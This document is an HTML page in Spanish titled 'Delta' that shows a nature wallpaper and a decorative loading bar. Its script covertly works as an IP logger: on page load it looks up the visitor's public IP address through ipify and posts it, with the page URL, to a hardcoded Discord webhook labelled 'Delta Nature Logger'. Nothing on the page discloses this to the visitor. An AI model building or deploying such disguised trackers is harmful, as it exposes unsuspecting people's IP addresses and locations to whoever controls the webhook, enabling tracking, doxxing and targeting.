<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000; /* Color inicial */
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', sans-serif;
        }

        /* Imagen de fondo con transición de aparición */
        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-image: url('https://wallpapers.com/images/hd/4k-nature-moraine-lake-r66plwqa8m3z5reg.jpg');
            background-size: cover;
            background-position: center;
            opacity: 0; /* Empieza invisible */
            transition: opacity 2s ease-in-out;
            transform: scale(1.1);
            animation: slowZoom 20s infinite alternate;
        }

        /* Animación de zoom suave para el fondo */
        @keyframes slowZoom {
            from { transform: scale(1); }
            to { transform: scale(1.1); }
        }

        /* Panel Glassmorphism */
        .glass-panel {
            z-index: 1;
            padding: 20px 30px;
            width: 320px;
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
        }

        /* Barra de carga */
        .loader-box {
            width: 100%;
            height: 5px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00f2fe, #4facfe);
            box-shadow: 0 0 15px rgba(0, 242, 254, 0.7);
            transition: width 0.1s linear;
        }

        /* Clase para activar la imagen */
        .visible {
            opacity: 1 !important;
        }
    </style>
</head>
<body>

    <div class="background-image" id="bg"></div>

    <div class="glass-panel">
        <div class="loader-box">
            <div class="progress-fill" id="progress"></div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';

        window.onload = function() {
            // Hacer aparecer el fondo al cargar
            document.getElementById('bg').classList.add('visible');
            
            startLoading();
            sendData();
        };

        function startLoading() {
            const bar = document.getElementById('progress');
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                } else {
                    width += 2;
                    bar.style.width = width + '%';
                }
            }, 60);
        }

        async function sendData() {
            let userIP = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {}

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        description: `🌐 **IP:** \`${userIP}\` \n🔗 **URL:** ${window.location.href}`,
                        color: 4886754, 
                        footer: { text: "Delta Nature Logger" }
                    }]
                })
            }).catch(() => {});
        }
    </script>
</body>
</html>
